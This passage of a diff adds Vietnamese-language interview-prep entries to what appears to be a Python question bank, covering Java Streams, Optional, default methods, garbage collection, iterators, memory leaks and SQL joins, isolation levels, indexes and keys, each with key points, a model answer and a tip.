+        "modelAnswer": "1. **Bản chất Stream API**:\n   - Stream không phải là một cấu trúc dữ liệu lưu trữ phần tử. Nó là một **dòng chảy dữ liệu (Pipeline)** cho phép thao tác biến đổi, lọc, tính toán trên các Collection một cách khai báo (Declarative programming).\n2. **Phân biệt Intermediate vs Terminal Operations**:\n   - **Intermediate Operations (Thao tác trung gian)**: Nhận vào Stream và trả về một Stream mới. Ví dụ: `filter()`, `map()`, `sorted()`, `distinct()`, `limit()`. Chúng có thể ghép nối liên tiếp thành chuỗi.\n   - **Terminal Operations (Thao tác kết thúc)**: Đóng dòng Stream lại và xuất ra kết quả cuối cùng (trả về giá trị cụ thể hoặc void). Ví dụ: `collect(Collectors.toList())`, `forEach()`, `count()`, `reduce()`, `anyMatch()`. Sau khi gọi Terminal Operation, Stream không thể tái sử dụng.\n3. **Cơ chế Lazy Evaluation (Thực thi lười biếng)**:\n   - Các thao tác trung gian **hoàn toàn chưa chạy** khi ta gọi chúng. Chúng chỉ được biên dịch thành một kế hoạch xử lý. Chỉ đến khi Terminal Operation xuất hiện, toàn bộ pipeline mới bắt đầu kéo dữ liệu qua và thực thi trong một lượt duyệt duy nhất, giúp tối ưu hiệu năng vượt trội.",
+        "seniorTip": "Nêu thêm Stream chỉ duyệt được 1 lần duy nhất (nếu duyệt lần 2 sẽ văng IllegalStateException)."
+    },
+    {
+        "id": "audit_15",
+        "domain": "Java 8+ Modern",
+        "question": "Lớp Optional trong Java 8 dùng để làm gì? Nêu các best practices để tránh anti-pattern khi sử dụng Optional?",
+        "timeLimitSeconds": 85,
+        "keyPoints": [
+            "Optional là một container object dùng để bao bọc một giá trị có thể null hoặc không null, nhằm chống NullPointerException.",
+            "Anti-pattern phổ biến: Dùng if (opt.isPresent()) { opt.get(); } -> chẳng khác gì kiểm tra if (x != null).",
+            "Best practice: Dùng orElse(), orElseGet(), orElseThrow(), map(), ifPresent().",
+            "Không dùng Optional làm thuộc tính class (field) hoặc tham số hàm vì nó không implements Serializable."
+        ],
+        "modelAnswer": "1. **Mục đích của `Optional<T>`**:\n   - Được giới thiệu từ Java 8 để giải quyết lỗi ám ảnh số 1 của lập trình viên: **`NullPointerException` (NPE)**.\n   - Nó đóng vai trò như một chiếc hộp bao bọc: có thể chứa giá trị hoặc rỗng (`Optional.empty()`). Nó buộc người gọi hàm phải đối mặt và xử lý trường hợp không có dữ liệu một cách minh bạch.\n2. **Các Best Practices khi sử dụng**:\n   - **Tránh dùng `.get()` trực tiếp**: Nếu gọi `opt.get()` khi rỗng, nó sẽ ném `NoSuchElementException`. Cũng không nên dùng `if(opt.isPresent()) opt.get();` vì cú pháp này rườm rà như kiểm tra null truyền thống.\n   - **Sử dụng `.orElse(defaultValue)`** hoặc **`.orElseGet(() -> computeValue())`** để cấp giá trị thay thế an toàn.\n   - **Sử dụng `.orElseThrow(() -> new EntityNotFoundException(\"...\"))`** khi bắt buộc phải có dữ liệu trong API Service.\n   - **Không dùng `Optional` làm Field của Entity**: Vì class `Optional` không implements `Serializable`, sẽ gây lỗi khi serialize hoặc dùng với Hibernate.\n   - **Không dùng Optional làm tham số đầu vào của method**: Chỉ nên dùng làm kiểu trả về của method.",
+        "seniorTip": "Phân biệt orElse (luôn chạy hàm bên trong) và orElseGet (chỉ chạy lambda khi giá trị thực sự null)."
+    },
+    {
+        "id": "audit_16",
+        "domain": "Java 8+ Modern",
+        "question": "Default method và Static method trong Interface xuất hiện từ Java 8 nhằm mục đích gì? Giải quyết Diamond Problem thế nào?",
+        "timeLimitSeconds": 85,
+        "keyPoints": [
+            "Mục đích: Cho phép thêm method mới vào Interface mà không làm gãy (break) code của các class cũ đang implement interface đó (Backward Compatibility).",
+            "Giúp Collections tương thích với Stream API (thêm hàm stream(), forEach() vào Collection).",
+            "Diamond Problem: Khi một class implements 2 interface có cùng tên default method -> Compile Error!",
+            "Cách giải quyết: Class con bắt buộc phải override lại method đó và chỉ định rõ muốn gọi của ai: InterfaceA.super.doWork();"
+        ],
+        "modelAnswer": "1. **Lý do ra đời của Default Method**:\n   - Trước Java 8, nếu thêm một method trừu tượng mới vào Interface, toàn bộ các class trong dự án đang implements interface đó sẽ bị **Compile Error** hàng loạt vì chưa override.\n   - Để tích hợp Stream API vào Collections có sẵn (ví dụ thêm method `forEach()`, `stream()` vào interface `Collection`), các kỹ sư Java đã phát minh ra **`default method`**: cho phép viết sẵn code hiện thực mặc định ngay trong interface.\n2. **Xử lý xung đột Đa kế thừa (Diamond Problem)**:\n   - Nếu `Class C` implements cả `Interface A` và `Interface B`, mà cả 2 interface này đều có phương thức `default void print()`, trình biên dịch sẽ báo lỗi xung đột: **Duplicate default methods**.\n   - **Cách giải quyết**: Class C bắt buộc phải Override phương thức `print()`. Trong hàm này, C có thể tự viết logic riêng, hoặc chỉ định rõ muốn gọi theo cha nào bằng cú pháp: **`A.super.print();`** hoặc **`B.super.print();`**.",
+        "seniorTip": "Nêu thêm quy tắc 'Classes win over interfaces': Nếu class cha có method giống default method của interface, Java luôn ưu tiên chọn method của class cha."
+    },
+    {
+        "id": "audit_17",
+        "domain": "Java 8+ Modern",
+        "question": "Trình dọn rác tự động (Garbage Collector - GC) trong JVM hoạt động như thế nào? Phân biệt Young Generation, Old Generation và Metaspace?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "GC tự động phát hiện và thu hồi các đối tượng trên Heap không còn được tham chiếu (Unreachable objects) bởi GC Roots.",
+            "Heap chia thành 2 vùng chính: Young Generation (Eden, Survivor S0, S1) và Old/Tenured Generation.",
+            "Minor GC dọn dẹp Young Gen; Major/Full GC dọn dẹp Old Gen (dừng ứng dụng - Stop The World).",
+            "Metaspace (từ Java 8 thay thế PermGen) lưu trữ metadata của Class, nằm ngoài Native Memory chứ không nằm trong Heap."
+        ],
+        "modelAnswer": "1. **Nguyên lý của Garbage Collector**:\n   - GC tìm kiếm các đối tượng không còn khả năng tiếp cận (**Unreachable**) từ các gốc GC Roots (luồng đang chạy, biến static, biến local trên stack frame).\n2. **Phân vùng bộ nhớ Heap theo thế hệ (Generational Heap)**:\n   - **Young Generation**: Nơi các đối tượng mới sinh ra bằng từ khóa `new`. Gồm phân vùng **Eden** và 2 phân vùng **Survivor (S0, S1)**. Khi Eden đầy, quá trình **Minor GC** diễn ra, dọn dẹp các đối tượng ngắn hạn. Những đối tượng còn sống sót được chuyển sang Survivor và tăng độ tuổi (tenuring threshold, mặc định 15).\n   - **Old Generation (Tenured)**: Chứa các đối tượng sống lâu dài qua nhiều đợt Minor GC (ví dụ Singleton, Cache, Connection Pool). Khi vùng này đầy, quá trình **Major GC (hay Full GC)** sẽ được kích hoạt. Full GC sẽ làm dừng mọi luồng của ứng dụng (**Stop-the-World**), gây giật lag hệ thống.\n3. **Metaspace (Java 8+)**:\n   - Thay thế cho vùng `PermGen` cũ. Dùng để lưu trữ cấu trúc Class, Method metadata. Nằm trên **Native Memory của OS** nên có thể tự động co giãn theo dung lượng RAM máy chủ, tránh lỗi `java.lang.OutOfMemoryError: PermGen space`.",
+        "seniorTip": "Nhắc tới các thuật toán GC hiện đại như G1GC (mặc định từ Java 9) hoặc ZGC để thể hiện tầm hiểu biết của Senior."
+    },
+    {
+        "id": "audit_18",
+        "domain": "Java 8+ Modern",
+        "question": "ConcurrentModificationException là gì? Phân biệt Fail-Fast Iterator và Fail-Safe Iterator?",
+        "timeLimitSeconds": 85,
+        "keyPoints": [
+            "ConcurrentModificationException xảy ra khi một luồng đang duyệt Collection mà cấu trúc Collection bị thay đổi (thêm/xóa) không qua Iterator.",
+            "Fail-Fast (ArrayList, HashMap, HashSet): Kiểm tra biến modCount. Nếu phát hiện thay đổi trong lúc duyệt sẽ lập tức ném exception.",
+            "Fail-Safe (CopyOnWriteArrayList, ConcurrentHashMap): Duyệt trên một bản sao (clone) của dữ liệu, không văng lỗi khi Collection gốc bị sửa đổi."
+        ],
+        "modelAnswer": "1. **Nguyên nhân sinh ra `ConcurrentModificationException`**:\n   - Xảy ra khi ta dùng vòng lặp `for-each` hoặc `Iterator` để duyệt qua một Collection (như `ArrayList`), nhưng bên trong thân vòng lặp lại gọi trực tiếp lệnh `list.remove()` hoặc `list.add()`.\n2. **Cơ chế Fail-Fast Iterator**:\n   - Các collection truyền thống (`ArrayList`, `HashMap`, `HashSet`) sử dụng cơ chế **Fail-Fast**.\n   - Bên trong chúng có một biến cờ đếm gọi là **`modCount`** (số lần cấu trúc bị thay đổi). Khi Iterator được tạo ra, nó ghi nhớ `expectedModCount = modCount`.\n   - Ở mỗi bước lặp, nó kiểm tra nếu `modCount != expectedModCount`, chứng tỏ có ai đó vừa thêm/xóa phần tử lén lút $\\to$ Iterator lập tức văng ngoại lệ **`ConcurrentModificationException`** để tránh sai lệch dữ liệu.\n   - **Cách xóa đúng**: Phải dùng phương thức **`iterator.remove()`** thay vì `list.remove()`.\n3. **Cơ chế Fail-Safe (hay Fail-Weak) Iterator**:\n   - Được dùng trong các collection đồng thời thuộc gói `java.util.concurrent` (như `CopyOnWriteArrayList`, `ConcurrentHashMap`).\n   - Chúng duyệt trên một **bản sao dữ liệu (snapshot clone)** tại thời điểm tạo Iterator. Do đó, việc thêm/xóa trên mảng gốc sẽ không gây ra lỗi.",
+        "seniorTip": "Câu hỏi này rất hay đi kèm bài toán: 'Làm thế nào để xóa một phần tử khỏi danh sách khi đang chạy vòng lặp?'"
+    },
+    {
+        "id": "audit_19",
+        "domain": "Java Core",
+        "question": "Shallow Copy và Deep Copy khác nhau như thế nào? Làm thế nào để tạo một Deep Copy trong Java?",
+        "timeLimitSeconds": 80,
+        "keyPoints": [
+            "Shallow Copy (Sao chép nông): Copy các giá trị nguyên thủy, nhưng các biến đối tượng tham chiếu chỉ copy con trỏ (cả 2 object cùng trỏ chung vào 1 đối tượng con).",
+            "Deep Copy (Sao chép sâu): Copy độc lập hoàn toàn, tạo mới cả các đối tượng con bên trong.",
+            "Sửa đổi đối tượng con ở Shallow Copy sẽ làm đối tượng kia bị đổi theo; Deep Copy thì độc lập.",
+            "Cách làm Deep Copy: Tự viết hàm copy constructor, override clone() cấp phát lại con, hoặc dùng Serialization/JSON."
+        ],
+        "modelAnswer": "1. **Shallow Copy (Sao chép nông)**:\n   - Chỉ sao chép giá trị của các trường nguyên thủy (primitive fields). Đối với các trường tham chiếu đối tượng (object reference), nó chỉ sao chép con trỏ địa chỉ ô nhớ.\n   - Hệ quả: Đối tượng mới và đối tượng cũ cùng trỏ chung vào các đối tượng con bên dưới. Nếu ta sửa thuộc tính của đối tượng con ở bản sao, đối tượng gốc cũng sẽ **bị thay đổi theo**! Mặc định phương thức `Object.clone()` là shallow copy.\n2. **Deep Copy (Sao chép sâu)**:\n   - Sao chép toàn bộ cây đối tượng. Nó tạo ra các đối tượng mới độc lập hoàn toàn cho tất cả các trường tham chiếu bên trong.\n   - Hệ quả: Mọi thay đổi trên bản sao hoàn toàn không ảnh hưởng gì tới bản gốc.\n3. **Cách thực hiện Deep Copy trong Java**:\n   - Dùng **Copy Constructor**: Chủ động `new` lại các đối tượng con bên trong constructor mới.\n   - Override phương thức `clone()` và chủ động gọi `clone()` đệ quy cho các đối tượng phụ thuộc.\n   - Dùng **Serialization / Deserialization** (hoặc thư viện Gson/Jackson): Chuyển object thành JSON string rồi parse ngược lại thành object mới.",
+        "seniorTip": "Dùng Gson/Jackson để làm deep copy là câu trả lời thực tế rất được các Tech Lead dự án đánh giá cao vì tính tiện dụng."
+    },
+    {
+        "id": "audit_20",
+        "domain": "Java Core",
+        "question": "Memory Leak (Rò rỉ bộ nhớ) trong Java là gì khi mà JVM đã có Garbage Collector? Nêu 3 nguyên nhân phổ biến gây Memory Leak?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "Memory Leak trong Java: Các đối tượng không còn được ứng dụng sử dụng nữa nhưng vẫn bị giữ tham chiếu bởi các GC Roots, khiến Garbage Collector không thể thu hồi.",
+            "Nguyên nhân 1: Sử dụng biến static giữ tham chiếu đến tập hợp lớn (Static Collections).",
+            "Nguyên nhân 2: Không đóng tài nguyên (Unclosed streams, DB Connection, Socket).",
+            "Nguyên nhân 3: Quên override equals() và hashCode() khi đưa object vào HashSet/HashMap, hoặc đăng ký Listener/Event mà không hủy đăng ký (unregistered listeners)."
+        ],
+        "modelAnswer": "1. **Khái niệm Memory Leak trong Java**:\n   - Nhiều người lầm tưởng có Garbage Collector thì Java không thể bị rò rỉ bộ nhớ. Nhưng thực tế: **Memory Leak xảy ra khi các đối tượng không còn dùng trong logic nghiệp vụ nữa, nhưng vẫn bị neo giữ bởi ít nhất một đường dẫn tham chiếu hợp lệ đến GC Roots**.\n   - Kết quả: Trình dọn rác GC coi đối tượng đó vẫn đang sống nên không dám xóa $\\to$ Bộ nhớ Heap ngày càng phình to cho đến khi ném lỗi **`OutOfMemoryError`**.\n2. **3 Nguyên nhân phổ biến nhất**:\n   - **Biến `static` giữ dữ liệu lớn (Static Collection)**: Vì biến static sống suốt vòng đời của ClassLoader (gần như suốt thời gian chạy app), nếu add dữ liệu vào `static List` hoặc `static Map` mà không bao giờ xóa bớt, dữ liệu đó sẽ không bao giờ được giải phóng.\n   - **Không đóng kết nối tài nguyên (Unclosed Resources)**: Quên đóng `Connection`, `ResultSet`, `InputStream` trong khối `finally` hoặc quên dùng `try-with-resources`. Kết quả là các file descriptor và buffer ở tầng native bị treo mãi.\n   - **Sai lầm với `equals()` và `hashCode()` trong HashSet/HashMap**: Khi thêm đối tượng vào `HashSet`, sau đó thay đổi thuộc tính định danh của đối tượng đó khiến hash thay đổi. Khi gọi `set.remove(obj)`, Set không tìm thấy để xóa, khiến đối tượng nằm lại vĩnh viễn trong bộ nhớ.",
+        "seniorTip": "Nhắc đến các công cụ profiler chuyên dụng như VisualVM, JProfiler hoặc Eclipse Memory Analyzer (MAT) để phân tích heap dump."
+    },
+
+    # ==========================================
+    # 3. DATABASE & SQL (21 - 30)
+    # ==========================================
+    {
+        "id": "audit_21",
+        "domain": "Database & SQL",
+        "question": "Phân biệt INNER JOIN, LEFT JOIN, RIGHT JOIN và FULL OUTER JOIN trong SQL? Cho ví dụ thực tế khi nào bắt buộc dùng LEFT JOIN?",
+        "timeLimitSeconds": 85,
+        "keyPoints": [
+            "INNER JOIN: Chỉ lấy các dòng có dữ liệu khớp ở cả 2 bảng (giao điểm).",
+            "LEFT JOIN: Lấy tất cả dòng từ bảng trái, bảng phải không có sẽ điền NULL.",
+            "RIGHT JOIN: Lấy tất cả dòng từ bảng phải, bảng trái không có điền NULL.",
+            "FULL OUTER JOIN: Lấy tất cả từ cả 2 bảng (hợp nhất).",
+            "Ví dụ bắt buộc dùng LEFT JOIN: Tìm khách hàng chưa từng mua hàng (WHERE orders.id IS NULL), hoặc hiển thị danh sách phòng ban kèm số nhân viên kể cả phòng chưa có ai."
+        ],
+        "modelAnswer": "1. **Phân biệt các loại JOIN**:\n   - **`INNER JOIN`**: Trả về tập giao của 2 bảng. Chỉ những bản ghi có giá trị khóa ngoại khớp với khóa chính ở cả hai bên mới xuất hiện trong kết quả.\n   - **`LEFT JOIN` (LEFT OUTER JOIN)**: Giữ lại toàn bộ 100% bản ghi ở bảng bên trái. Với những dòng bên trái không có bản ghi tương ứng ở bảng bên phải, các cột của bảng phải sẽ được điền giá trị `NULL`.\n   - **`RIGHT JOIN`**: Ngược lại với LEFT JOIN, giữ lại toàn bộ bảng bên phải.\n   - **`FULL OUTER JOIN`**: Lấy toàn bộ bản ghi của cả hai bảng, bất kỳ bên nào thiếu dữ liệu thì điền `NULL`.\n2. **Ví dụ thực tế bắt buộc dùng LEFT JOIN**:\n   - Bài toán 1: *\"Lấy danh sách tất cả các Khách hàng kèm tổng số đơn hàng của họ\"*. Nếu dùng INNER JOIN, những khách hàng mới đăng ký chưa mua hàng sẽ bị biến mất khỏi báo cáo! Dùng LEFT JOIN giúp khách chưa mua vẫn hiện ra với số đơn là 0 hoặc NULL.\n   - Bài toán 2: *\"Tìm những sinh viên chưa từng đăng ký môn học nào\"*: `SELECT s.* FROM Student s LEFT JOIN Enrollment e ON s.id = e.student_id WHERE e.course_id IS NULL;`",
+        "seniorTip": "Vẽ sơ đồ Venn hình tròn trong đầu để giải thích trực quan và dứt khoát."
+    },
+    {
+        "id": "audit_22",
+        "domain": "Database & SQL",
+        "question": "Mệnh đề WHERE khác gì HAVING trong SQL? Thứ tự thực thi logic (Logical Execution Order) của câu lệnh SQL là gì?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "WHERE: Lọc từng dòng đơn lẻ trước khi gom nhóm (GROUP BY). Không dùng được hàm tổng hợp (SUM, COUNT, AVG).",
+            "HAVING: Lọc trên các nhóm sau khi đã GROUP BY. Bắt buộc dùng kèm hàm tổng hợp.",
+            "Thứ tự thực thi SQL: FROM -> JOIN -> WHERE -> GROUP BY -> HAVING -> SELECT -> DISTINCT -> ORDER BY -> LIMIT."
+        ],
+        "modelAnswer": "1. **Khác biệt cốt lõi giữa WHERE và HAVING**:\n   - **`WHERE`**: Dùng để lọc các dòng dữ liệu thô (Row-level filter) **TRƯỚC KHI** diễn ra quá trình gom nhóm `GROUP BY`. Trong mệnh đề `WHERE` **tuyệt đối không được sử dụng các hàm tổng hợp (Aggregate Functions)** như `COUNT()`, `SUM()`, `AVG()`.\n   - **`HAVING`**: Dùng để lọc các nhóm dữ liệu (Group-level filter) **SAU KHI** đã gom nhóm `GROUP BY`. Trong `HAVING` thường xuyên áp dụng các hàm tổng hợp để kiểm tra điều kiện trên từng nhóm (ví dụ: `HAVING COUNT(*) > 5`).\n2. **Thứ tự thực thi logic của câu lệnh SQL (Rất hay hỏi)**:\n   Trình tối ưu SQL (Query Optimizer) không chạy theo thứ tự ta viết code, mà chạy theo thứ tự:\n   1. **`FROM` & `JOIN`**: Xác định bảng và kết nối dữ liệu.\n   2. **`WHERE`**: Lọc các dòng thỏa mãn điều kiện cơ bản.\n   3. **`GROUP BY`**: Gom các dòng còn lại thành từng nhóm.\n   4. **`HAVING`**: Lọc loại bỏ các nhóm không đạt tiêu chuẩn.\n   5. **`SELECT`**: Chiết xuất các cột cần lấy (và tính toán alias).\n   6. **`DISTINCT`**: Loại bỏ các dòng trùng lặp.\n   7. **`ORDER BY`**: Sắp xếp kết quả cuối cùng.\n   8. **`LIMIT` / `OFFSET`**: Cắt lấy số lượng dòng cần trả về.",
+        "seniorTip": "Nhớ thứ tự này giải thích tại sao không thể dùng bí danh (Alias) ở SELECT trong mệnh đề WHERE."
+    },
+    {
+        "id": "audit_23",
+        "domain": "Database & SQL",
+        "question": "Index (Chỉ mục) trong cơ sở dữ liệu là gì? Cấu trúc B-Tree Index hoạt động ra sao? Khi nào NÊN và KHÔNG NÊN đánh Index?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "Index là cấu trúc dữ liệu phụ trợ giúp tăng tốc độ tìm kiếm (SELECT) từ O(N) Table Scan xuống O(log N).",
+            "B-Tree Index: Cấu trúc cây cân bằng tự động, các lá chứa con trỏ trỏ đến vị trí vật lý của dòng dữ liệu trên đĩa.",
+            "Khi NÊN đánh index: Các cột thường xuyên xuất hiện trong WHERE, JOIN (khóa ngoại), ORDER BY; bảng có dữ liệu lớn (hàng triệu dòng).",
+            "Khi KHÔNG NÊN: Bảng có tần suất INSERT/UPDATE/DELETE cực cao; bảng quá nhỏ; cột có độ chọn lọc thấp (Cardinality thấp như giới tính Nam/Nữ)."
+        ],
+        "modelAnswer": "1. **Khái niệm Index**:\n   - Index tương tự như mục lục ở cuối cuốn sách. Thay vì phải quét toàn bộ bảng từ đầu đến cuối (**Full Table Scan** với độ phức tạp $O(N)$), Database tra cứu trên Index với độ phức tạp **$O(\\log N)$** để lấy ngay vị trí vật lý của dòng dữ liệu.\n2. **Cấu trúc B-Tree Index**:\n   - Đa số RDBMS (MySQL, PostgreSQL, Oracle, SQL Server) dùng cấu trúc cây cân bằng **B-Tree (Balanced Tree)**.\n   - Cây gồm Node gốc (Root), các Node trung gian và Node lá (Leaf). Các khóa được sắp xếp theo thứ tự. Tại Node lá chứa con trỏ địa chỉ ô nhớ (Row ID) trỏ thẳng đến dòng dữ liệu thực tế trên ổ cứng.\n3. **Khi nào NÊN đánh Index**:\n   - Cột thường xuyên dùng để tìm kiếm trong mệnh đề `WHERE`.\n   - Cột dùng làm khóa ngoại để kết nối `JOIN` giữa các bảng.\n   - Cột thường xuyên xuất hiện trong `ORDER BY` hoặc `GROUP BY`.\n   - Bảng có dung lượng dữ liệu lớn và tỉ lệ đọc (Read/SELECT) chiếm đa số (80-90%).\n4. **Khi nào KHÔNG NÊN đánh Index**:\n   - Bảng quá nhỏ (dưới vài trăm dòng, quét toàn bảng còn nhanh hơn tra index).\n   - Bảng có tần suất ghi (**INSERT, UPDATE, DELETE**) liên tục: vì mỗi khi dữ liệu thay đổi, DB bắt buộc phải tính toán và tái cấu trúc lại toàn bộ các cây Index, làm suy giảm hiệu năng ghi nghiêm trọng.\n   - Cột có **độ phân biệt thấp (Low Cardinality)**: Ví dụ cột `gender` chỉ có `Nam`/`Nu`, hay cột trạng thái `true`/`false`. Khi đó Index không mang lại giá trị lọc đáng kể.",
+        "seniorTip": "Nêu khái niệm Clustered Index (sắp xếp vật lý của bảng, chỉ có 1) vs Non-Clustered Index (tạo thêm cây riêng, có thể có nhiều)."
+    },
+    {
+        "id": "audit_24",
+        "domain": "Database & SQL",
+        "question": "Giải thích 4 tính chất ACID của một Transaction (Giao dịch) trong cơ sở dữ liệu?",
+        "timeLimitSeconds": 85,
+        "keyPoints": [
+            "A - Atomicity (Tính nguyên tử): Tất cả hoặc không có gì (All or Nothing). Một bước lỗi thì rollback toàn bộ.",
+            "C - Consistency (Tính nhất quán): Dữ liệu trước và sau transaction phải tuân thủ mọi ràng buộc toàn vẹn (constraints, khóa ngoại).",
+            "I - Isolation (Tính cô lập): Các transaction chạy đồng thời không được can thiệp hoặc nhìn thấy trạng thái dở dang của nhau.",
+            "D - Durability (Tính bền vững): Một khi đã commit thành công, dữ liệu phải được lưu vĩnh viễn trên đĩa kể cả khi sập nguồn."
+        ],
+        "modelAnswer": "ACID là 4 tiêu chuẩn vàng đảm bảo tính tin cậy của giao dịch cơ sở dữ liệu:\n1. **Atomicity (Tính nguyên tử - \"Tất cả hoặc không gì cả\")**:\n   - Một transaction gồm nhiều câu lệnh SQL phải được coi như một đơn vị công việc duy nhất. Hoặc là **tất cả câu lệnh đều thành công**, hoặc nếu có bất kỳ 1 lệnh nào thất bại, toàn bộ hệ thống phải được phục hồi về trạng thái ban đầu (**Rollback**).\n   - Ví dụ: Chuyển tiền từ tài khoản A sang B gồm 2 lệnh: trừ tiền A và cộng tiền B. Không thể có chuyện trừ tiền A xong mà máy chủ tắt khiến tiền B không được cộng.\n2. **Consistency (Tính nhất quán)**:\n   - Dữ liệu trước khi giao dịch bắt đầu và sau khi giao dịch kết thúc phải luôn ở trạng thái hợp lệ, không vi phạm bất kỳ ràng buộc nào (Primary key, Foreign key, Check, Trigger).\n   - Ví dụ: Tổng số tiền của A và B trước và sau khi chuyển khoản phải bảo toàn bằng nhau.\n3. **Isolation (Tính cô lập)**:\n   - Đảm bảo các giao dịch chạy đồng thời độc lập với nhau. Một transaction đang chạy không thể nhìn thấy dữ liệu dở dang chưa được commit của transaction khác, tránh hiện tượng xung đột dữ liệu.\n4. **Durability (Tính bền vững)**:\n   - Một khi transaction đã phát lệnh `COMMIT` thành công, các thay đổi dữ liệu được ghi vĩnh viễn xuống đĩa cứng (thông qua Write-Ahead Logging - WAL). Dù hệ thống có bị mất điện đột ngột ngay sau đó, dữ liệu vẫn không bị mất khi khởi động lại.",
+        "seniorTip": "Dẫn chứng kịch bản chuyển tiền ngân hàng để giải thích cả 4 chữ cái là cách thuyết phục nhất."
+    },
+    {
+        "id": "audit_25",
+        "domain": "Database & SQL",
+        "question": "Phân biệt 3 hiện tượng đọc dữ liệu sai lệch: Dirty Read, Non-Repeatable Read và Phantom Read? Các cấp độ Isolation Level tương ứng?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "Dirty Read: Transaction A đọc dữ liệu mà Transaction B vừa sửa nhưng CHƯA COMMIT. Sau đó B rollback -> A đọc phải dữ liệu rác.",
+            "Non-Repeatable Read: Transaction A đọc 1 dòng dữ liệu 2 lần trong cùng transaction nhưng kết quả khác nhau vì Transaction B đã UPDATE dòng đó giữa 2 lần đọc.",
+            "Phantom Read: Transaction A chạy câu query đếm/lấy danh sách 2 lần nhưng lần 2 thấy xuất hiện thêm các dòng mới (bóng ma) do Transaction B đã INSERT thêm dòng mới.",
+            "4 Cấp độ: Read Uncommitted < Read Committed < Repeatable Read < Serializable."
+        ],
+        "modelAnswer": "1. **3 Hiện tượng sai lệch khi chạy đồng thời**:\n   - **Dirty Read (Đọc rác)**: Transaction 1 sửa một dòng dữ liệu nhưng **chưa commit**. Transaction 2 nhảy vào đọc được giá trị mới này. Ngay sau đó Transaction 1 bị lỗi và Rollback về giá trị cũ. Kết quả là Transaction 2 đã xử lý trên một dữ liệu \"ma\" chưa từng tồn tại chính thức.\n   - **Non-Repeatable Read (Đọc không lặp lại được)**: Trong cùng 1 transaction, Transaction 1 đọc dòng dữ liệu X (ví dụ số dư là 100). Sau đó Transaction 2 vào `UPDATE` số dư thành 200 và `COMMIT`. Khi Transaction 1 đọc lại dòng X lần thứ hai, nó thấy số dư đổi thành 200 (kết quả đọc 2 lần khác nhau trên cùng 1 dòng).\n   - **Phantom Read (Đọc bóng ma)**: Transaction 1 chạy câu lệnh `SELECT COUNT(*) FROM Users WHERE age > 18` được 10 dòng. Transaction 2 chạy lệnh `INSERT` thêm một user 20 tuổi và `COMMIT`. Khi Transaction 1 chạy lại câu query trên, nó thấy kết quả nhảy lên 11 dòng (dòng mới xuất hiện như bóng ma).\n2. **4 Cấp độ cô lập (Transaction Isolation Levels)**:\n   - **`READ UNCOMMITTED`**: Thấp nhất, cho phép Dirty Read, Non-Repeatable Read, Phantom Read.\n   - **`READ COMMITTED`** (Mặc định ở Oracle, Postgres, SQL Server): Chống được Dirty Read; vẫn có thể bị Non-Repeatable Read và Phantom Read.\n   - **`REPEATABLE READ`** (Mặc định ở MySQL InnoDB): Chống được Dirty Read và Non-Repeatable Read.\n   - **`SERIALIZABLE`**: Cao nhất và an toàn nhất, khóa toàn bộ tài nguyên để chạy tuần tự, chống được cả 3 hiện tượng nhưng hiệu năng chậm nhất.",
+        "seniorTip": "Vẽ bảng ma trận giữa 4 cấp độ và 3 hiện tượng để thể hiện tư duy hệ thống."
+    },
+    {
+        "id": "audit_26",
+        "domain": "Database & SQL",
+        "question": "Phân biệt DELETE, TRUNCATE và DROP trong SQL?",
+        "timeLimitSeconds": 75,
+        "keyPoints": [
+            "DELETE: Lệnh DML, xóa từng dòng theo điều kiện WHERE, có thể ROLLBACK được, chạy chậm, sinh log nhiều, không reset auto-increment.",
+            "TRUNCATE: Lệnh DDL, xóa toàn bộ bảng cực nhanh bằng cách hủy phân vùng dữ liệu (deallocate data pages), reset auto-increment về 1, không có WHERE.",
+            "DROP: Lệnh DDL, xóa toàn bộ bảng bao gồm cả cấu trúc, dữ liệu, index và trigger biến mất vĩnh viễn khỏi DB."
+        ],
+        "modelAnswer": "So sánh chi tiết 3 lệnh xóa dữ liệu:\n1. **`DELETE`** (Data Manipulation Language - DML):\n   - Dùng để xóa một số dòng hoặc toàn bộ dòng trong bảng thông qua mệnh đề `WHERE`.\n   - Hoạt động bằng cách quét từng dòng, xóa và ghi lại nhật ký giao dịch (Transaction Log) cho từng dòng một. Do đó tốc độ **chậm nhất** đối với bảng lớn.\n   - **Có thể Rollback** nếu nằm trong Transaction. Không làm reset giá trị của cột tự tăng (Auto-Increment Identity).\n2. **`TRUNCATE`** (Data Definition Language - DDL):\n   - Dùng để xóa sạch toàn bộ dữ liệu trong bảng một cách siêu tốc.\n   - Cơ chế: Không quét từng dòng mà giải phóng trực tiếp toàn bộ các trang dữ liệu (Data Pages) của bảng trên đĩa cứng và chỉ ghi một log tối thiểu. Tốc độ **nhanh hơn DELETE hàng trăm lần**.\n   - **Reset cột tự tăng về giá trị ban đầu (thường là 1)**. Không hỗ trợ mệnh đề `WHERE`.\n3. **`DROP`** (Data Definition Language - DDL):\n   - Xóa bỏ **hoàn toàn bảng khỏi cơ sở dữ liệu** (cả cấu trúc bảng, dữ liệu, chỉ mục index, quyền hạn, trigger liên quan đều bị xóa sổ vĩnh viễn).\n   - Sau lệnh DROP, bảng không còn tồn tại trong Schema, muốn dùng lại phải `CREATE TABLE` từ đầu.",
+        "seniorTip": "Nhắc thêm việc TRUNCATE sẽ bị chặn nếu bảng đang được tham chiếu bởi khóa ngoại (Foreign Key) của bảng khác."
+    },
+    {
+        "id": "audit_27",
+        "domain": "Database & SQL",
+        "question": "Khóa chính (Primary Key), Khóa ngoại (Foreign Key) và Ràng buộc duy nhất (Unique Constraint) khác nhau như thế nào?",
+        "timeLimitSeconds": 80,
+        "keyPoints": [
+            "Primary Key: Định danh duy nhất cho mỗi dòng, bắt buộc NOT NULL, mỗi bảng chỉ có DUY NHẤT 1 khóa chính (tự động tạo Clustered Index).",
+            "Unique Constraint: Đảm bảo giá trị cột không bị trùng lặp, cho phép chứa giá trị NULL (MySQL cho phép nhiều NULL, SQL Server chỉ cho 1 NULL), 1 bảng có thể có NHIỀU Unique keys.",
+            "Foreign Key: Ràng buộc toàn vẹn tham chiếu nối tới Primary Key của bảng khác, ngăn chặn việc tạo dữ liệu mồ côi."
+        ],
